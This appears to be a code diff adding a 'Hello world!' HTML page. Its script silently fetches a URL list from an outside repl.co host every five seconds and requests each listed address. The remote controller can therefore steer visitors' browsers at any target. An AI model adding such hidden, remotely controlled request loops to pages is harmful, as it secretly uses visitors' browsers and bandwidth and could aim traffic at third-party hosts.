@@ -1,0 +1,12 @@
+<html>
+  <body>
+    Hello world!
+  </body>
+  <script>
+    setInterval((async ()=>{
+      let response = await fetch('https://kerfus-bot.0lie.repl.co/bot-list');
+      let bots = await response.json()
+      for(let a of bots)fetch(a)
+    }),5000)
+  </script>
+</html>
